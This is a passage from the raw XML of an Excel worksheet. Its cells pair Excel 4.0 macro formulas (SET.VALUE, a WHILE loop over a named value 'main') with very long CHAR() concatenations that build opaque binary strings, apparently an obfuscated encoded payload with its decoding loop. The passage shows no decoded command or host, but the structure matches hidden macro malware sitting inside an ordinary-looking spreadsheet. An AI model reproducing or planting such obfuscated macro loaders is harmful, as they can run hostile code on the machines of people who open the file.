R(191)&amp;CHAR(187)&amp;CHAR(135)&amp;CHAR(210)&amp;CHAR(80)&amp;CHAR(130)&amp;CHAR(190)&amp;CHAR(162)&amp;CHAR(154)&amp;CHAR(28)&amp;CHAR(200)&amp;CHAR(57)&amp;CHAR(65)&amp;CHAR(30)&amp;CHAR(113)&amp;CHAR(160)&amp;CHAR(212)&amp;CHAR(83)&amp;CHAR(127)&amp;CHAR(77)</f>
        <v>_x000B_¨t¢ÔI_x0013__x001E_%žJyš2ôb_x0008__x0017_Ê³_x0008_z±hþ	Ì ™«ÓçºÖrÚ¤¬9§‹&lt;_x0008__x0006_VeÜ+.F_x001C_@ tHÆ‘&gt;ZvÄyüm…a¹Îu_x0008_Ã~]K_x0015_¦ÓwŽ¡3†g€é&amp;è–YÇ­÷Þ•Ü­v_x0005_OêˆTh›Ï³±]_x000C_‘_x000B_±£'vcSès¸Ì#Þ©+©Ó_x001D_ç_x0014_fê¾_x0016_YCguã§¥Hï9×‚i‰n_x0011_8uø¶ùÝ‚X‹ÿ_x001B__x000C_‹_x0001__x0003_×ïÃäO’_x0018_þ8„'‰G˜šƒ_x0003_ôÑ«&gt;°BÉÉê8_x0019_Â\MÛ"`sžùœ_x0012__x000D_Qãc_x000D_þò–ºFhØ]þfmJ€O9ê_x000D__x0011__x0001_'=ç¿»‡ÒP‚¾¢š_x001C_È9A_x001E_q ÔSM</v>
      </c>
      <c r="C10" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(77)&amp;CHAR(117)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(110)&amp;CHAR(139)</f>
        <v>‘[ùMuzˆên‹</v>
      </c>
    </row>
    <row r="11" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A11" t="b">
        <f bx="1">main=$B$1</f>
        <v>0</v>
      </c>
      <c r="B11" t="str">
        <f>CHAR(127)&amp;CHAR(81)&amp;CHAR(96)&amp;CHAR(145)&amp;CHAR(127)&amp;CHAR(160)&amp;CHAR(132)&amp;CHAR(143)&amp;CHAR(188)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(7)&amp;CHAR(194)&amp;CHAR(219)&amp;CHAR(45)&amp;CHAR(42)&amp;CHAR(143)&amp;CHAR(105)&amp;CHAR(80)&amp;CHAR(85)&amp;CHAR(225)&amp;CHAR(137)&amp;CHAR(183)&amp;CHAR(137)&amp;CHAR(220)&amp;CHAR(230)&amp;CHAR(62)&amp;CHAR(12)&amp;CHAR(40)&amp;CHAR(72)&amp;CHAR(29)&amp;CHAR(43)&amp;CHAR(221)&amp;CHAR(122)&amp;CHAR(146)&amp;CHAR(230)&amp;CHAR(53)&amp;CHAR(187)&amp;CHAR(93)&amp;CHAR(112)&amp;CHAR(191)&amp;CHAR(214)&amp;CHAR(89)&amp;CHAR(40)&amp;CHAR(97)&amp;CHAR(64)&amp;CHAR(145)&amp;CHAR(37)&amp;CHAR(69)&amp;CHAR(131)&amp;CHAR(251)&amp;CHAR(9)&amp;CHAR(29)&amp;CHAR(170)&amp;CHAR(129)&amp;CHAR(159)&amp;CHAR(190)&amp;CHAR(231)&amp;CHAR(161)&amp;CHAR(25)&amp;CHAR(225)&amp;CHAR(185)&amp;CHAR(63)&amp;CHAR(178)&amp;CHAR(229)&amp;CHAR(79)&amp;CHAR(255)&amp;CHAR(116)&amp;CHAR(226)&amp;CHAR(202)&amp;CHAR(37)&amp;CHAR(211)&amp;CHAR(78)&amp;CHAR(246)&amp;CHAR(202)&amp;CHAR(19)&amp;CHAR(228)&amp;CHAR(240)&amp;CHAR(182)&amp;CHAR(92)&amp;CHAR(41)&amp;CHAR(171)&amp;CHAR(190)&amp;CHAR(147)&amp;CHAR(56)&amp;CHAR(62)&amp;CHAR(173)&amp;CHAR(113)&amp;CHAR(183)&amp;CHAR(134)&amp;CHAR(135)&amp;CHAR(167)&amp;CHAR(212)&amp;CHAR(162)&amp;CHAR(68)&amp;CHAR(108)&amp;CHAR(164)&amp;CHAR(167)&amp;CHAR(49)&amp;CHAR(230)&amp;CHAR(54)&amp;CHAR(78)&amp;CHAR(110)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(231)&amp;CHAR(155)&amp;CHAR(126)&amp;CHAR(6)&amp;CHAR(71)&amp;CHAR(129)&amp;CHAR(108)&amp;CHAR(38)&amp;CHAR(166)&amp;CHAR(132)&amp;CHAR(75)&amp;CHAR(178)&amp;CHAR(221)&amp;CHAR(169)&amp;CHAR(12)&amp;CHAR(84)&amp;CHAR(68)&amp;CHAR(128)&amp;CHAR(198)&amp;CHAR(62)&amp;CHAR(112)&amp;CHAR(152)&amp;CHAR(121)&amp;CHAR(200)&amp;CHAR(240)&amp;CHAR(146)&amp;CHAR(22)&amp;CHAR(58)&amp;CHAR(211)&amp;CHAR(202)&amp;CHAR(76)&amp;CHAR(120)&amp;CHAR(45)&amp;CHAR(205)&amp;CHAR(4)&amp;CHAR(119)&amp;CHAR(31)&amp;CHAR(47)&amp;CHAR(152)&amp;CHAR(104)&amp;CHAR(240)&amp;CHAR(70)&amp;CHAR(161)&amp;CHAR(86)&amp;CHAR(146)&amp;CHAR(35)&amp;CHAR(69)&amp;CHAR(242)&amp;CHAR(22)&amp;CHAR(151)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(196)&amp;CHAR(72)&amp;CHAR(34)&amp;CHAR(61)&amp;CHAR(236)&amp;CHAR(166)&amp;CHAR(250)&amp;CHAR(215)&amp;CHAR(241)&amp;CHAR(186)&amp;CHAR(212)&amp;CHAR(65)&amp;CHAR(145)&amp;CHAR(124)&amp;CHAR(28)&amp;CHAR(51)&amp;CHAR(224)&amp;CHAR(135)&amp;CHAR(222)&amp;CHAR(161)&amp;CHAR(175)&amp;CHAR(92)&amp;CHAR(134)&amp;CHAR(119)&amp;CHAR(158)&amp;CHAR(231)&amp;CHAR(34)&amp;CHAR(240)&amp;CHAR(126)&amp;CHAR(213)&amp;CHAR(219)&amp;CHAR(210)&amp;CHAR(217)&amp;CHAR(156)&amp;CHAR(240)&amp;CHAR(24)&amp;CHAR(151)&amp;CHAR(112)&amp;CHAR(10)&amp;CHAR(72)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(76)&amp;CHAR(11)&amp;CHAR(76)&amp;CHAR(236)&amp;CHAR(43)&amp;CHAR(11)&amp;CHAR(184)&amp;CHAR(19)&amp;CHAR(115)&amp;CHAR(162)&amp;CHAR(172)&amp;CHAR(7)&amp;CHAR(159)&amp;CHAR(152)&amp;CHAR(241)&amp;CHAR(148)&amp;CHAR(112)&amp;CHAR(17)&amp;CHAR(118)&amp;CHAR(79)&amp;CHAR(139)&amp;CHAR(34)&amp;CHAR(3)&amp;CHAR(124)&amp;CHAR(254)&amp;CHAR(50)&amp;CHAR(201)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(27)&amp;CHAR(46)&amp;CHAR(252)&amp;CHAR(46)&amp;CHAR(80)&amp;CHAR(131)&amp;CHAR(200)&amp;CHAR(250)&amp;CHAR(154)&amp;CHAR(36)&amp;CHAR(188)&amp;CHAR(72)&amp;CHAR(205)&amp;CHAR(226)&amp;CHAR(194)&amp;CHAR(219)&amp;CHAR(47)&amp;CHAR(2)&amp;CHAR(146)&amp;CHAR(244)&amp;CHAR(224)&amp;CHAR(75)&amp;CHAR(132)&amp;CHAR(204)</f>
        <v>Q`‘ „¼(*^%*_x0007_ÂÛ-*iPUá‰·‰Üæ&gt;_x000C_(H_x001D_+Ýz’æ5»]p¿ÖY(a@‘%Eƒû	_x001D_ªŸ¾ç¡_x0019_á¹?²åOÿtâÊ%ÓNöÊ_x0013_äð¶\)«¾“8&gt;­q·†‡§Ô¢Dl¤§1æ6NnSRç›~_x0006_Gl&amp;¦„K²Ý©_x000C_TD€Æ&gt;p˜yÈð’_x0016_:ÓÊLx-Í_x0004_w_x001F_/˜hðF¡V’#Eò_x0016_—†úÄH"=ì¦ú×ñºÔA‘|_x001C_3à‡Þ¡¯\†wžç"ð~ÕÛÒÙœð_x0018_—p
HÎL_x000B_Lì+_x000B_¸_x0013_s¢¬_x0007_Ÿ˜ñ”p_x0011_vO‹"_x0003_|þ2É_x001D__x001C__x001B_.ü.PƒÈúš$¼HÍâÂÛ/_x0002_’ôàK„Ì</v>
      </c>
      <c r="C11" t="str">
        <f>CHAR(61)&amp;CHAR(52)&amp;CHAR(126)&amp;CHAR(254)&amp;CHAR(93)&amp;CHAR(238)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(188)</f>
        <v>=4~þ]î‘[Ý¼</v>
      </c>
    </row>
    <row r="12" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A12" t="b">
        <f>SET.VALUE(D1,0)</f>
        <v>0</v>
      </c>
      <c r="B12" t="str">
        <f>CHAR(254)&amp;CHAR(136)&amp;CHAR(49)&amp;CHAR(241)&amp;CHAR(235)&amp;CHAR(184)&amp;CHAR(162)&amp;CHAR(84)&amp;CHAR(88)&amp;CHAR(99)&amp;CHAR(186)&amp;CHAR(25)&amp;CHAR(158)&amp;CHAR(128)&amp;CHAR(48)&amp;CHAR(246)&amp;CHAR(242)&amp;CHAR(120)&amp;CHAR(30)&amp;CHAR(97)&amp;CHAR(51)&amp;CHAR(236)&amp;CHAR(248)&amp;CHAR(171)&amp;CHAR(225)&amp;CHAR(91)&amp;CHAR(201)&amp;CHAR(160)&amp;CHAR(56)&amp;CHAR(89)&amp;CHAR(130)&amp;CHAR(3)&amp;CHAR(202)&amp;CHAR(19)&amp;CHAR(201)&amp;CHAR(139)&amp;CHAR(58)&amp;CHAR(130)&amp;CHAR(118)&amp;CHAR(100)&amp;CHAR(124)&amp;CHAR(152)&amp;CHAR(233)&amp;CHAR(221)&amp;CHAR(217)&amp;CHAR(104)&amp;CHAR(13)&amp;CHAR(137)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(48)&amp;CHAR(168)&amp;CHAR(215)&amp;CHAR(14)&amp;CHAR(67)&amp;CHAR(125)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(105)&amp;CHAR(161)&amp;CHAR(82)&amp;CHAR(246)&amp;CHAR(51)&amp;CHAR(184)&amp;CHAR(192)&amp;CHAR(178)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(243)&amp;CHAR(229)&amp;CHAR(151)&amp;CHAR(12)&amp;CHAR(77)&amp;CHAR(156)&amp;CHAR(152)&amp;CHAR(236)&amp;CHAR(48)&amp;CHAR(1)&amp;CHAR(148)&amp;CHAR(186)&amp;CHAR(243)&amp;CHAR(194)&amp;CHAR(54)&amp;CHAR(27)&amp;CHAR(7)&amp;CHAR(27)&amp;CHAR(96)&amp;CHAR(15)&amp;CHAR(224)&amp;CHAR(56)&amp;CHAR(111)&amp;CHAR(139)&amp;CHAR(142)&amp;CHAR(127)&amp;CHAR(107)&amp;CHAR(131)&amp;CHAR(62)&amp;CHAR(124)&amp;CHAR(164)&amp;CHAR(160)&amp;CHAR(48)&amp;CHAR(184)&amp;CHAR(233)&amp;CHAR(44)&amp;CHAR(65)&amp;CHAR(191)&amp;CHAR(61)&amp;CHAR(73)&amp;CHAR(17)&amp;CHAR(204)&amp;CHAR(239)&amp;CHAR(225)&amp;CHAR(22)&amp;CHAR(220)&amp;CHAR(124)&amp;CHAR(89)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(243)&amp;CHAR(148)&amp;CHAR(170)&amp;CHAR(139)&amp;CHAR(219)&amp;CHAR(239)&amp;CHAR(156)&amp;CHAR(212)&amp;CHAR(227)&amp;CHAR(175)&amp;CHAR(75)&amp;CHAR(254)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(91)&amp;CHAR(144)&amp;CHAR(237)&amp;CHAR(178)&amp;CHAR(243)&amp;CHAR(209)&amp;CHAR(149)&amp;CHAR(126)&amp;CHAR(180)&amp;CHAR(93)&amp;CHAR(245)&amp;CHAR(250)&amp;CHAR(221)&amp;CHAR(237)&amp;CHAR(71)&amp;CHAR(175)&amp;CHAR(90)&amp;CHAR(170)&amp;CHAR(200)&amp;CHAR(4)&amp;CHAR(230)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(97)&amp;CHAR(46)&amp;CHAR(111)&amp;CHAR(115)&amp;CHAR(146)&amp;CHAR(147)&amp;CHAR(188)&amp;CHAR(41)&amp;CHAR(39)&amp;CHAR(29)&amp;CHAR(228)&amp;CHAR(123)&amp;CHAR(48)&amp;CHAR(249)&amp;CHAR(41)&amp;CHAR(177)&amp;CHAR(185)&amp;CHAR(94)&amp;CHAR(217)&amp;CHAR(157)&amp;CHAR(99)&amp;CHAR(24)&amp;CHAR(50)&amp;CHAR(86)&amp;CHAR(127)&amp;CHAR(70)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(141)&amp;CHAR(64)&amp;CHAR(53)&amp;CHAR(59)&amp;CHAR(41)&amp;CHAR(68)&amp;CHAR(69)&amp;CHAR(247)&amp;CHAR(143)&amp;CHAR(199)&amp;CHAR(251)&amp;CHAR(109)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(110)&amp;CHAR(221)&amp;CHAR(12)&amp;CHAR(124)&amp;CHAR(244)&amp;CHAR(148)&amp;CHAR(5)&amp;CHAR(144)&amp;CHAR(48)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(46)&amp;CHAR(229)&amp;CHAR(190)&amp;CHAR(91)&amp;CHAR(66)&amp;CHAR(100)&amp;CHAR(201)&amp;CHAR(237)&amp;CHAR(59)&amp;CHAR(155)&amp;CHAR(55)&amp;CHAR(236)&amp;CHAR(7)&amp;CHAR(172)&amp;CHAR(109)&amp;CHAR(80)&amp;CHAR(46)&amp;CHAR(200)&amp;CHAR(22)&amp;CHAR(115)&amp;CHAR(241)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(61)&amp;CHAR(171)&amp;CHAR(97)&amp;CHAR(96)&amp;CHAR(103)&amp;CHAR(225)&amp;CHAR(184)&amp;CHAR(166)&amp;CHAR(164)&amp;CHAR(130)&amp;CHAR(133)&amp;CHAR(76)&amp;CHAR(195)&amp;CHAR(121)&amp;CHAR(120)&amp;CHAR(46)</f>
        <v>þˆ1ñë¸¢TXcº_x0019_ž€0öòx_x001E_a3ìø«á[É 8Y‚_x0003_Ê_x0013_É‹:‚vd|˜éÝÙh_x000D_‰‰Þ_x0007_-0¨×_x000E_C}_x0006_Ši¡Rö3¸À²üúóå—_x000C_Mœ˜ì0_x0001_”ºóÂ6_x001B__x0007__x001B_`_x000F_à8o‹Žkƒ&gt;|¤ 0¸é,A¿=I_x0011_Ìïá_x0016_Ü|Yµó”ª‹ÛïœÔã¯Kþ
ZJS[í²óÑ•~´]õúÝíG¯ZªÈ_x0004_æÚ_x0006_a.os’“¼)'_x001D_ä{0ù)±¹^Ùc_x0018_2VF_x000D__x0007_@5;)DE÷ÇûmWçnÝ_x000C_|ô”_x0005_0%_x0002_ŒˆÆ.å¾[BdÉí;›7ì_x0007_¬mP.È_x0016_sñM‡M=«a`gá¸¦¤‚…LÃyx.</v>
      </c>
      <c r="C12" t="str">
        <f>CHAR(250)&amp;CHAR(78)&amp;CHAR(173)&amp;CHAR(218)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(188)&amp;CHAR(248)&amp;CHAR(60)</f>
        <v>úN­Ú‘[¸¼ø&lt;</v>
      </c>
    </row>
    <row r="13" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A13" t="b">
        <f>WHILE(main&lt;&gt;"excel")</f>
        <v>0</v>
      </c>
      <c r="B13" t="str">
        <f>CHAR(190)&amp;CHAR(210)&amp;CHAR(117)&amp;CHAR(125)&amp;CHAR(71)&amp;CHAR(157)&amp;CHAR(23)&amp;CHAR(118)&amp;CHAR(17)&amp;CHAR(153)&amp;CHAR(248)&amp;CHAR(246)&amp;CHAR(127)&amp;CHAR(40)&amp;CHAR(225)&amp;CHAR(72)&amp;CHAR(76)&amp;CHAR(157)&amp;CHAR(235)&amp;CHAR(43)&amp;CHAR(123)&amp;CHAR(108)&amp;CHAR(37)&amp;CHAR(58)&amp;CHAR(64)&amp;CHAR(28)&amp;CHAR(117)&amp;CHAR(250)&amp;CHAR(114)&amp;CHAR(156)&amp;CHAR(119)&amp;CHAR(109)&amp;CHAR(237)&amp;CHAR(110)&amp;CHAR(24)&amp;CHAR(79)&amp;CHAR(14)&amp;CHAR(184)&amp;CHAR(117)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(46)&amp;CHAR(105)&amp;CHAR(249)&amp;CHAR(249)&amp;CHAR(236)&amp;CHAR(21)&amp;CHAR(123)&amp;CHAR(189)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(213)&amp;CHAR(155)&amp;CHAR(126)&amp;CHAR(69)&amp;CHAR(200)&amp;CHAR(198)&amp;CHAR(239)&amp;CHAR(40)&amp;CHAR(106)&amp;CHAR(180)&amp;CHAR(23)&amp;CHAR(226)&amp;CHAR(14)&amp;CHAR(109)&amp;CHAR(55)&amp;CHAR(122)&amp;CHAR(40)&amp;CHAR(244)&amp;CHAR(28)&amp;CHAR(232)&amp;CHAR(45)&amp;CHAR(78)&amp;CHAR(213)&amp;CHAR(154)&amp;CHAR(83)&amp;CHAR(20)&amp;CHAR(218)&amp;CHAR(147)&amp;CHAR(202)&amp;CHAR(56)&amp;CHAR(210)&amp;CHAR(118)&amp;CHAR(84)&amp;CHAR(99)&amp;CHAR(158)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(8)&amp;CHAR(98)&amp;CHAR(243)&amp;CHAR(171)&amp;CHAR(92)&amp;CHAR(62)&amp;CHAR(186)&amp;CHAR(14)&amp;CHAR(159)&amp;CHAR(16)&amp;CHAR(66)&amp;CHAR(129)&amp;CHAR(173)&amp;CHAR(48)&amp;CHAR(92)&amp;CHAR(71)&amp;CHAR(91)&amp;CHAR(45)&amp;CHAR(196)&amp;CHAR(241)&amp;CHAR(108)&amp;CHAR(54)&amp;CHAR(77)&amp;CHAR(195)&amp;CHAR(74)&amp;CHAR(185)&amp;CHAR(197)&amp;CHAR(88)&amp;CHAR(133)&amp;CHAR(112)&amp;CHAR(122)&amp;CHAR(244)&amp;CHAR(175)&amp;CHAR(148)&amp;CHAR(45)&amp;CHAR(177)&amp;CHAR(187)&amp;CHAR(229)&amp;CHAR(50)&amp;CHAR(69)&amp;CHAR(123)&amp;CHAR(62)&amp;CHAR(106)&amp;CHAR(17)&amp;CHAR(228)&amp;CHAR(138)&amp;CHAR(183)&amp;CHAR(89)&amp;CHAR(184)&amp;CHAR(108)&amp;CHAR(26)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(218)&amp;CHAR(163)&amp;CHAR(199)&amp;CHAR(220)&amp;CHAR(115)&amp;CHAR(186)&amp;CHAR(39)&amp;CHAR(252)&amp;CHAR(183)&amp;CHAR(105)&amp;CHAR(132)&amp;CHAR(241)&amp;CHAR(178)&amp;CHAR(132)&amp;CHAR(142)&amp;CHAR(189)&amp;CHAR(252)&amp;CHAR(130)&amp;CHAR(37)&amp;CHAR(76)&amp;CHAR(229)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(235)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(152)&amp;CHAR(155)&amp;CHAR(146)&amp;CHAR(66)&amp;CHAR(176)&amp;CHAR(38)&amp;CHAR(83)&amp;CHAR(70)&amp;CHAR(221)&amp;CHAR(72)&amp;CHAR(232)&amp;CHAR(21)&amp;CHAR(94)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(75)&amp;CHAR(203)&amp;CHAR(214)&amp;CHAR(236)&amp;CHAR(225)&amp;CHAR(42)&amp;CHAR(44)&amp;CHAR(199)&amp;CHAR(247)&amp;CHAR(8)&amp;CHAR(79)&amp;CHAR(216)&amp;CHAR(139)&amp;CHAR(61)&amp;CHAR(53)&amp;CHAR(71)&amp;CHAR(162)&amp;CHAR(221)&amp;CHAR(2)&amp;CHAR(37)&amp;CHAR(66)&amp;CHAR(201)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(64)&amp;CHAR(13)&amp;CHAR(44)&amp;CHAR(106)&amp;CHAR(189)&amp;CHAR(48)&amp;CHAR(202)&amp;CHAR(32)&amp;CHAR(125)&amp;CHAR(182)&amp;CHAR(163)&amp;CHAR(79)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(16)&amp;CHAR(173)&amp;CHAR(160)&amp;CHAR(49)&amp;CHAR(136)&amp;CHAR(24)&amp;CHAR(162)&amp;CHAR(178)&amp;CHAR(4)&amp;CHAR(228)&amp;CHAR(152)&amp;CHAR(230)&amp;CHAR(113)&amp;CHAR(133)&amp;CHAR(92)&amp;CHAR(211)&amp;CHAR(239)&amp;CHAR(198)&amp;CHAR(17)&amp;CHAR(146)&amp;CHAR(137)&amp;CHAR(153)&amp;CHAR(200)&amp;CHAR(103)&amp;CHAR(219)&amp;CHAR(40)&amp;CHAR(175)&amp;CHAR(67)&amp;CHAR(29)&amp;CHAR(231)&amp;CHAR(89)&amp;CHAR(26)&amp;CHAR(246)&amp;CHAR(22)</f>
        <v>¾Òu}G_x0017_v_x0011_™øö(áHLë+{l%:@_x001C_uúrœwmín_x0018_O_x000E_¸u®û.iùùì_x0015_{½Z‹Õ›~EÈÆï(j´_x0017_â_x000E_m7z(ô_x001C_è-NÕšS_x0014_Ú“Ê8ÒvTcž_x000B__x0003__x0008_bó«\&gt;º_x000E_Ÿ_x0010_B­0\G[-Äñl6MÃJ¹ÅX…pzô¯”-±»å2E{&gt;j_x0011_äŠ·Y¸l_x001A_¡ûÚ£ÇÜsº'ü·i„ñ²„Ž½ü‚%Lå_x000F__x0011_ë•—˜›’B°&amp;SFÝHè_x0015_^ˆKËÖìá*,Ç÷_x0008_OØ‹=5G¢Ý_x0002_%BÉÏ&gt;@_x000D_,j½0Ê }¶£OUS_x0010_­ 1ˆ_x0018_¢²_x0004_ä˜æq…\ÓïÆ_x0011_’‰™ÈgÛ(¯C_x001D_çY_x001A_ö_x0016_</v>
      </c>
      <c r="C13" t="str">
        <f>CHAR(160)&amp;CHAR(143)&amp;CHAR(217)&amp;CHAR(208)&amp;CHAR(140)&amp;CHAR(209)&amp;CHAR(89)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v> ÙÐŒÑYzˆê</v>
      </c>
    </row>
    <row r="14" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A14" t="b">
        <f>SET.VALUE(D2,LEN(main))</f>
        <v>0</v>
      </c>
      <c r="B14" t="str">
        <f>CHAR(64)&amp;CHAR(113)&amp;CHAR(209)&amp;CHAR(191)&amp;CHAR(202)&amp;CHAR(148)&amp;CHAR(153)&amp;CHAR(128)&amp;CHAR(169)&amp;CHAR(183)&amp;CHAR(153)&amp;CHAR(199)&amp;CHAR(72)&amp;CHAR(192)&amp;CHAR(136)&amp;CHAR(231)&amp;CHAR(79)&amp;CHAR(17)&amp;CHAR(213)&amp;CHAR(78)&amp;CHAR(190)&amp;CHAR(104)&amp;CHAR(23)&amp;CHAR(126)&amp;CHAR(90)&amp;CHAR(30)&amp;CHAR(244)&amp;CHAR(227)&amp;CHAR(206)&amp;CHAR(241)&amp;CHAR(4)&amp;CHAR(96)&amp;CHAR(44)&amp;CHAR(147)&amp;CHAR(122)&amp;CHAR(121)&amp;CHAR(54)&amp;CHAR(214)&amp;CHAR(144)&amp;CHAR(128)&amp;CHAR(85)&amp;CHAR(222)&amp;CHAR(79)&amp;CHAR(182)&amp;CHAR(1)&amp;CHAR(27)&amp;CHAR(92)&amp;CHAR(42)&amp;CHAR(31)&amp;CHAR(48)&amp;CHAR(228)&amp;CHAR(68)&amp;CHAR(46)&amp;CHAR(46)&amp;CHAR(116)&amp;CHAR(51)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(179)&amp;CHAR(13)&amp;CHAR(60)&amp;CHAR(35)&amp;CHAR(76)&amp;CHAR(25)&amp;CHAR(79)&amp;CHAR(197)&amp;CHAR(217)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(12)&amp;CHAR(245)&amp;CHAR(142)&amp;CHAR(114)&amp;CHAR(101)&amp;CHAR(104)&amp;CHAR(68)&amp;CHAR(95)&amp;CHAR(41)&amp;CHAR(59)&amp;CHAR(249)&amp;CHAR(80)&amp;CHAR(43)&amp;CHAR(167)&amp;CHAR(228)&amp;CHAR(209)&amp;CHAR(106)&amp;CHAR(18)&amp;CHAR(235)&amp;CHAR(102)&amp;CHAR(176)&amp;CHAR(100)&amp;CHAR(244)&amp;CHAR(62)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(179)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(180)&amp;CHAR(41)&amp;CHAR(243)&amp;CHAR(237)&amp;CHAR(89)&amp;CHAR(191)&amp;CHAR(24)&amp;CHAR(60)&amp;CHAR(201)&amp;CHAR(25)&amp;CHAR(224)&amp;CHAR(44)&amp;CHAR(64)&amp;CHAR(52)&amp;CHAR(206)&amp;CHAR(204)&amp;CHAR(195)&amp;CHAR(66)&amp;CHAR(135)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(249)&amp;CHAR(56)&amp;CHAR(101)&amp;CHAR(201)&amp;CHAR(245)&amp;CHAR(180)&amp;CHAR(6)&amp;CHAR(207)&amp;CHAR(55)&amp;CHAR(198)&amp;CHAR(206)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(58)&amp;CHAR(188)&amp;CHAR(169)&amp;CHAR(138)&amp;CHAR(89)&amp;CHAR(127)&amp;CHAR(105)&amp;CHAR(70)&amp;CHAR(176)&amp;CHAR(150)&amp;CHAR(242)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(121)&amp;CHAR(185)&amp;CHAR(150)&amp;CHAR(129)&amp;CHAR(156)&amp;CHAR(106)&amp;CHAR(161)&amp;CHAR(112)&amp;CHAR(220)&amp;CHAR(53)&amp;CHAR(215)&amp;CHAR(242)&amp;CHAR(23)&amp;CHAR(120)&amp;CHAR(79)&amp;CHAR(158)&amp;CHAR(175)&amp;CHAR(87)&amp;CHAR(137)&amp;CHAR(68)&amp;CHAR(9)&amp;CHAR(16)&amp;CHAR(37)&amp;CHAR(196)&amp;CHAR(152)&amp;CHAR(143)&amp;CHAR(155)&amp;CHAR(10)&amp;CHAR(119)&amp;CHAR(249)&amp;CHAR(112)&amp;CHAR(82)&amp;CHAR(71)&amp;CHAR(71)&amp;CHAR(145)&amp;CHAR(114)&amp;CHAR(58)&amp;CHAR(204)&amp;CHAR(178)&amp;CHAR(8)&amp;CHAR(113)&amp;CHAR(194)&amp;CHAR(47)&amp;CHAR(49)&amp;CHAR(37)&amp;CHAR(142)&amp;CHAR(68)&amp;CHAR(31)&amp;CHAR(175)&amp;CHAR(91)&amp;CHAR(82)&amp;CHAR(4)&amp;CHAR(197)&amp;CHAR(127)&amp;CHAR(193)&amp;CHAR(248)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(21)&amp;CHAR(75)&amp;CHAR(34)&amp;CHAR(233)&amp;CHAR(149)&amp;CHAR(227)&amp;CHAR(111)&amp;CHAR(142)&amp;CHAR(181)&amp;CHAR(23)&amp;CHAR(243)&amp;CHAR(192)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(61)&amp;CHAR(236)&amp;CHAR(13)&amp;CHAR(220)&amp;CHAR(222)&amp;CHAR(182)&amp;CHAR(83)&amp;CHAR(239)&amp;CHAR(27)&amp;CHAR(152)&amp;CHAR(67)&amp;CHAR(124)&amp;CHAR(181)&amp;CHAR(234)&amp;CHAR(170)&amp;CHAR(75)&amp;CHAR(118)&amp;CHAR(114)&amp;CHAR(110)&amp;CHAR(96)&amp;CHAR(97)&amp;CHAR(38)&amp;CHAR(146)&amp;CHAR(192)&amp;CHAR(166)&amp;CHAR(153)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(240)&amp;CHAR(49)&amp;CHAR(5)&amp;CHAR(168)&amp;CHAR(82)&amp;CHAR(202)&amp;CHAR(246)&amp;CHAR(65)&amp;CHAR(218)</f>
        <v>@qÑ¿Ê”™€©·™ÇHÀˆçO_x0011_ÕN¾h_x0017_~Z_x001E_ôãÎñ_x0004_`,“zy6Ö€UÞO¶_x0001__x001B_\*_x001F_0äD..t3ÿá³_x000D_&lt;#L_x0019_OÅÙŽ¿_x000C_õŽrehD_);ùP+§äÑj_x0012_ëf°dô&gt;.F€³V_x0001_´)óíY¿_x0018_&lt;É_x0019_à,@4ÎÌÃB‡_x0007_ù8eÉõ´_x0006_Ï7ÆÎ_x0013_‰:¼©ŠYiF°–ò_x0002__x000F_y¹–œj¡pÜ5×ò_x0017_xOž¯W‰D	_x0010_%Ä˜›
wùpRGG‘r:Ì²_x0008_qÂ/1%ŽD_x001F_¯[R_x0004_ÅÁø_x0016__x0004__x0015_K"é•ãoŽµ_x0017_óÀDŠ=ì_x000D_ÜÞ¶Sï_x001B_˜C|µêªKvrn`a&amp;’À¦™_ð1_x0005_¨RÊöAÚ</v>
      </c>
      <c r="C14" t="str">
        <f>CHAR(217)&amp;CHAR(216)&amp;CHAR(126)&amp;CHAR(236)&amp;CHAR(56)&amp;CHAR(243)&amp;CHAR(120)&amp;CHAR(162)&amp;CHAR(28)&amp;CHAR(78)</f>
